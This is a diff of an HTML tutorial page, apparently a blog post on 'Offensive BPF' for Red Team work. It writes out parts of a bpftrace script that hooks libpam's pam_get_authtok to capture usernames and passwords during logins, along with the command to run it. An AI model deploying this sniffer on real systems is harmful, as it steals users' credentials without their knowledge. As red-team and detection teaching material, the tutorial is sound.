@@ -150,19 +150,19 @@
 <h2 id="declaring-the-stub-pam_handle-struct">Declaring the stub pam_handle struct</h2>
 <p>The  first step is to make sure we have the right data structure available. <code>pam_private.h</code> is <a href="https://github.com/linux-pam/linux-pam/blob/master/libpam/pam_private.h">the header file</a> in the Linux source.</p>
 <p>Technically you can  include the header file directly, but it might not be available if you trying to &ldquo;live off the land&rdquo; during a Red Team exercise. The <code>filler</code> is a bit of a hack, but it works quite well.</p>
-<pre><code>struct partial_pam_handle {
+<pre tabindex="0"><code>struct partial_pam_handle {
       char *filler[6];
       char *user;
 };
 </code></pre><p>Next, we create a <code>BEGIN</code> section to just show some information on the Console</p>
-<pre><code>BEGIN 
+<pre tabindex="0"><code>BEGIN 
 { 
       printf(&quot;Welcome to Offensive BPF. Sniffing PAM authentications...&quot;);
       printf(&quot;Ctrl-C to exit.\n\n&quot;);
 }
 </code></pre><h2 id="hooking-the-pam_get_authtok-function">Hooking the pam_get_authtok function</h2>
 <p>Now we create the core of the bpftrace program by hooking the <code>pam_getauthtok</code> call, reading the username and the password into a variable and printing them out once the function returns.</p>
-<pre><code>uprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok 
+<pre tabindex="0"><code>uprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok 
 {
       @user[tid] = ((struct partial_pam_handle *)arg0)-&gt;user;
       @authtok[tid] =  arg2;
@@ -184,7 +184,7 @@ uretprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok
 <p>Also, recall that <code>/ @user[tid] /</code> is the syntax to apply a filter.</p>
 <h2 id="running-pamsnoopbt">Running pamsnoop.bt</h2>
 <p>Run the script with <code>sudo bpftrace pamsnoop.bt</code>.</p>
-<pre><code>hacker@commodore:~$ sudo bpftrace tracepam.bt 
+<pre tabindex="0"><code>hacker@commodore:~$ sudo bpftrace tracepam.bt 
 Attaching 3 probes...
 Welcome to Offensive BPF. Sniffing PAM authentications...Ctrl-C to exit.
 
